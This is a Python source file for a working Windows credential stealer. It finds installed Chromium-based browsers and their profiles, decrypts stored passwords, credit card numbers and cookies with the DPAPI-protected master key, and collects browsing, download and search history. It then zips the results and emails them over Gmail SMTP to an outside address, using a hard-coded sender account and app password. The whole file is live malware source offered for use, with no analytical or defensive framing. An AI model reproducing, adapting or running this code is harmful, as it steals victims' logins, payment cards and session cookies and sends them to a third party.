import base64
import json
import os
import shutil
import sqlite3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from Crypto.Cipher import AES
import zipfile 
from email import encoders
from email.mime.base import MIMEBase
from win32crypt import CryptUnprotectData

if os.name != "nt":
    print("This script is intended to run on Windows only.")
    exit()

appData = os.getenv('LOCALAPPDATA')

Browsers = {
    'amigo': appData + '\\Amigo\\User Data',
    'torch': appData + '\\Torch\\User Data',
    'kometa': appData + '\\Kometa\\User Data',
    'orbitum': appData + '\\Orbitum\\User Data',
    'cent-browser': appData + '\\CentBrowser\\User Data',
    '7star': appData + '\\7Star\\7Star\\User Data',
    'sputnik': appData + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appData + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appData + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appData + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appData + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appData + '\\Microsoft\\Edge\\User Data',
    'uran': appData + '\\uCozMedia\\Uran\\User Data',
    'yandex': appData + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appData + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appData + '\\Iridium\\User Data',
}

Queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['Website URL', 'Username', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Card Holder Name', 'Expiration Month', 'Expiration Year', 'Card Number', 'Last Modified'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Encrypted Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['Website URL', 'Page Title', 'Last Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Downloaded URL', 'Local File Path'],
        'decrypt': False
    },
    'search_history': {
        'query': 'SELECT term, normalized_term FROM keyword_search_terms',
        'file': '\\History',
        'columns': ['Search Term', 'Normalized Term'],
        'decrypt': False
    }
}

class PasswordUtils:
    @staticmethod
    def getMasterKey(path: str):
        if not os.path.exists(path):
            return None

        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state_content = f.read()

        if 'os_crypt' not in local_state_content:
            return None

        local_state = json.loads(local_state_content)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        return key
    
    @staticmethod
    def decryptPassword(encrypted_password: bytes, key: bytes) -> str:
        initialization_vector = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, initialization_vector)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

class BrowserUtils:
    @staticmethod
    def getData(path: str, profile: str, key, type_of_data):
        db_file = os.path.join(path, f'{profile}{type_of_data["file"]}')
        if not os.path.exists(db_file):
            return ""

        result = ""
        shutil.copy(db_file, 'Vault.db')

        conn = sqlite3.connect('Vault.db')
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])

        for row in cursor.fetchall():
            row = list(row)

            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes):
                        row[i] = PasswordUtils.decryptPassword(row[i], key)

            row_text = "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
            result += row_text

        conn.close()
        return result

    @staticmethod
    def installedBrowsers():
        available_browsers = []
        for browser_name, browser_path in Browsers.items():
            if os.path.exists(browser_path):
                available_browsers.append(browser_name)
        return available_browsers

    @staticmethod
    def allProfiles(browser_path):
        profiles = ['Default']
        profile_dir = os.path.join(browser_path)
        for entry in os.scandir(profile_dir):
            if entry.is_dir() and entry.name.startswith("Profile"):
                profiles.append(entry.name)
        return profiles
    
    @staticmethod
    def sendDataByEmail(browser_name, profile, data_type, content):
        email = 'ransomware693@gmail.com'
        password = 'lcvp kxio xboj kwji'
        recipient = 'etubeemeka@gmail.com'

        # Create a secure connection with Gmail's outgoing SMTP server
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)

        # Create a MIME message to send
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = recipient
        msg['Subject'] = f'{browser_name} - {profile} - {data_type}'

        text = f'{browser_name} - {profile} - {data_type}'
        part = MIMEText(text)
        msg.attach(part)

        if content:
            part = MIMEText(content)
            msg.attach(part)

        # Create a ZIP file containing the content
        zip_filename = f'{browser_name}_{profile}_{data_type}.zip'
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.writestr(f'{browser_name}_{profile}_{data_type}.txt', content)

        # Attach the ZIP file to the email
        part = MIMEBase('application', 'octet-stream')
        with open(zip_filename, 'rb') as f:
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{zip_filename}"')
        msg.attach(part)

        # Send the email
        server.sendmail(email, recipient, msg.as_string())

        # Close the connection to the SMTP server
        server.quit()

if __name__ == '__main__':
    browser_utils = BrowserUtils()
    password_utils = PasswordUtils()

    available_browsers = browser_utils.installedBrowsers()

    for browser in available_browsers:
        browser_path = Browsers[browser]
        master_key = password_utils.getMasterKey(browser_path)
        if not master_key:
            continue
        print(f'Browser Found: {browser}')
        profiles = browser_utils.allProfiles(browser_path)
        for profile in profiles:
            print(f'>>Profile Found: {profile}')
            for queryName, queryItem in Queries.items():
                try:
                    data = browser_utils.getData(browser_path, profile, master_key, queryItem)
                    # Send the extracted data via email instead of saving it
                    browser_utils.sendDataByEmail(browser, profile, queryName, data)
                except Exception as e:
                    print(f"An error occurred while extracting '{queryName}' data from '{browser}' profile '{profile}':")
                    print(e)
                    raise e
